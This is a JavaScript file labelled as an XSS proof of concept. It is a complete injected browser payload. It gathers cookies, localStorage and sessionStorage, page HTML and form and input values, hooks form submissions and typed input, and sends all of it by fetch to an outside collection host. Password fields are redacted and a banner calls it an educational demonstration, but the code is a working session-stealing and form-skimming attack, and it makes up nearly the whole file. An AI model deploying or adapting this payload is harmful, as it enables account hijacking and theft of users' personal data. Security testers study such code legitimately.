(function() {
    'use strict';
    
    console.log('üîç XSS PoC Loaded - Simple PUT Method');
    
    // Configuration
    const CONFIG = {
        exfilEndpoint: 'http://osscrm01t.phda.com.cn/pentestguin/collect.html',
        debug: true
    };

    /**
     * Collect victim information
     */
    function collectData() {
        const data = {
            // Basic Info
            timestamp: new Date().toISOString(),
            url: window.location.href,
            origin: window.location.origin,
            referrer: document.referrer,
            
            // Browser Info
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            
            // Screen Info
            screenResolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            
            // Sensitive Data
            cookies: document.cookie,
            localStorage: {},
            sessionStorage: {},
            
            // DOM Info
            title: document.title,
            htmlContent: document.documentElement.outerHTML.substring(0, 5000),
            
            // Forms
            forms: Array.from(document.forms).map(form => ({
                action: form.action,
                method: form.method,
                inputs: Array.from(form.elements).map(el => ({
                    name: el.name,
                    type: el.type,
                    value: el.type === 'password' ? '[REDACTED]' : el.value
                }))
            })),
            
            // All input fields
            inputs: Array.from(document.querySelectorAll('input, textarea')).map(el => ({
                type: el.type,
                name: el.name,
                value: el.type === 'password' ? '[REDACTED]' : el.value
            }))
        };
        
        // Extract localStorage
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data.localStorage[key] = localStorage.getItem(key);
            }
        } catch(e) {
            data.localStorage = { error: e.message };
        }
        
        // Extract sessionStorage
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                data.sessionStorage[key] = sessionStorage.getItem(key);
            }
        } catch(e) {
            data.sessionStorage = { error: e.message };
        }
        
        return data;
    }

    /**
     * Send data via PUT request
     */
    function sendViaPUT(data) {
        const payload = JSON.stringify(data);
        
        if (CONFIG.debug) {
            console.log(`üì§ Sending PUT request to ${CONFIG.exfilEndpoint}`);
            console.log(`üìä Data size: ${payload.length} bytes`);
        }
        
        fetch(CONFIG.exfilEndpoint, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json'
            },
            body: payload,
            mode: 'no-cors'
        })
        .then(() => {
            if (CONFIG.debug) {
                console.log('‚úÖ PUT request sent');
            }
        })
        .catch(err => {
            if (CONFIG.debug) {
                console.log('‚ùå PUT request failed:', err.message);
            }
        });
    }

    /**
     * Hook into form submissions
     */
    function hookForms() {
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            const data = {
                type: 'form_submission',
                timestamp: new Date().toISOString(),
                url: window.location.href,
                action: form.action,
                method: form.method,
                fields: {}
            };
            
            for (let [key, value] of formData.entries()) {
                data.fields[key] = value;
            }
            
            sendViaPUT(data);
            
            if (CONFIG.debug) {
                console.log('üìù Form submission captured:', data);
            }
        }, true);
    }

    /**
     * Hook into input fields
     */
    function hookInputs() {
        let inputBuffer = {};
        let sendTimeout;
        
        document.addEventListener('input', function(e) {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                const fieldId = e.target.name || e.target.id || 'unnamed';
                
                inputBuffer[fieldId] = {
                    name: e.target.name,
                    type: e.target.type,
                    value: e.target.type === 'password' ? '[REDACTED]' : e.target.value,
                    timestamp: new Date().toISOString()
                };
                
                clearTimeout(sendTimeout);
                sendTimeout = setTimeout(() => {
                    if (Object.keys(inputBuffer).length > 0) {
                        const data = {
                            type: 'input_capture',
                            timestamp: new Date().toISOString(),
                            url: window.location.href,
                            fields: inputBuffer
                        };
                        
                        sendViaPUT(data);
                        
                        if (CONFIG.debug) {
                            console.log('‚å®Ô∏è Input captured:', data);
                        }
                        
                        inputBuffer = {};
                    }
                }, 3000);
            }
        }, true);
    }

    /**
     * Create visual alert
     */
    function createVisualAlert() {
        const alertBox = document.createElement('div');
        alertBox.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #ff4444, #cc0000);
            color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            z-index: 999999;
            font-family: monospace;
            max-width: 350px;
        `;
        alertBox.innerHTML = `
            <strong>‚ö†Ô∏è XSS PoC Active (PUT Method)</strong><br>
            <small>Educational Security Demonstration</small><br>
            <small>Target: ${CONFIG.exfilEndpoint}</small><br>
            <button onclick="this.parentElement.remove()" style="margin-top:10px;padding:5px 10px;cursor:pointer;background:#fff;border:none;border-radius:4px;">
                Close
            </button>
        `;
        
        document.body.appendChild(alertBox);
        
        setTimeout(() => {
            if (alertBox.parentElement) {
                alertBox.remove();
            }
        }, 15000);
    }

    /**
     * Main execution
     */
    function execute() {
        console.log('üöÄ Starting XSS PoC with simple PUT method...');
        
        try {
            // Collect and send data
            const data = collectData();
            sendViaPUT(data);
            
            // Hook forms and inputs
            hookForms();
            hookInputs();
            
            // Show visual alert
            createVisualAlert();
            
            console.log('‚úÖ XSS PoC execution complete');
            
        } catch (error) {
            console.error('‚ùå Error:', error);
        }
    }

    // Execute when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', execute);
    } else {
        execute();
    }

})();
